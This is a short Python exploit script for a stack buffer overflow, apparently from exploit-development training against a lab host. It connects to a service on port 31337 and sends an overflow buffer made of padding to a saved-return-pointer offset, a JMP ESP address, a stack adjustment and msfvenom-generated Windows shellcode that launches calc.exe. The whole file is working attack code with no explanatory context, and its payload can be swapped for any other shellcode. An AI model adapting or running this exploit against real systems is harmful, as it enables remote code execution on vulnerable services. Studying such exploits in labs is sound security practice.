import socket
import struct

RHOST = "10.92.92.129"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buffer_total_length = 1024
offset_srp = 146
# msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
ptr_jmp_esp = 0x080414C3

# sub esp,0x10
# \x83\xec\x101
sub_esp = b"\x83\xec\x10"

shellcode_calc =  b""
shellcode_calc += b"\xbe\x68\xbc\xaf\x50\xda\xd1\xd9\x74\x24"
shellcode_calc += b"\xf4\x5f\x33\xc9\xb1\x31\x31\x77\x13\x03"
shellcode_calc += b"\x77\x13\x83\xef\x94\x5e\x5a\xac\x8c\x1d"
shellcode_calc += b"\xa5\x4d\x4c\x42\x2f\xa8\x7d\x42\x4b\xb8"
shellcode_calc += b"\x2d\x72\x1f\xec\xc1\xf9\x4d\x05\x52\x8f"
shellcode_calc += b"\x59\x2a\xd3\x3a\xbc\x05\xe4\x17\xfc\x04"
shellcode_calc += b"\x66\x6a\xd1\xe6\x57\xa5\x24\xe6\x90\xd8"
shellcode_calc += b"\xc5\xba\x49\x96\x78\x2b\xfe\xe2\x40\xc0"
shellcode_calc += b"\x4c\xe2\xc0\x35\x04\x05\xe0\xeb\x1f\x5c"
shellcode_calc += b"\x22\x0d\xcc\xd4\x6b\x15\x11\xd0\x22\xae"
shellcode_calc += b"\xe1\xae\xb4\x66\x38\x4e\x1a\x47\xf5\xbd"
shellcode_calc += b"\x62\x8f\x31\x5e\x11\xf9\x42\xe3\x22\x3e"
shellcode_calc += b"\x39\x3f\xa6\xa5\x99\xb4\x10\x02\x18\x18"
shellcode_calc += b"\xc6\xc1\x16\xd5\x8c\x8e\x3a\xe8\x41\xa5"
shellcode_calc += b"\x46\x61\x64\x6a\xcf\x31\x43\xae\x94\xe2"
shellcode_calc += b"\xea\xf7\x70\x44\x12\xe7\xdb\x39\xb6\x63"
shellcode_calc += b"\xf1\x2e\xcb\x29\x9f\xb1\x59\x54\xed\xb2"
shellcode_calc += b"\x61\x57\x41\xdb\x50\xdc\x0e\x9c\x6c\x37"
shellcode_calc += b"\x6b\x42\x8f\x92\x81\xeb\x16\x77\x28\x76"
shellcode_calc += b"\xa9\xad\x6e\x8f\x2a\x44\x0e\x74\x32\x2d"
shellcode_calc += b"\x0b\x30\xf4\xdd\x61\x29\x91\xe1\xd6\x4a"
shellcode_calc += b"\xb0\x81\xb9\xd8\x58\x68\x5c\x59\xfa\x74"


buffer = b""
buffer += b"A" * (offset_srp - len(buffer)) # padding
buffer += struct.pack('<I', ptr_jmp_esp)
buffer += sub_esp
buffer += shellcode_calc
# buffer += b"\xCC\xCC\xCC\xCC" # ESP points here
buffer += b"D" * (buffer_total_length - len(buffer)) # trailing padding
buffer += b"\n"

s.send(buffer)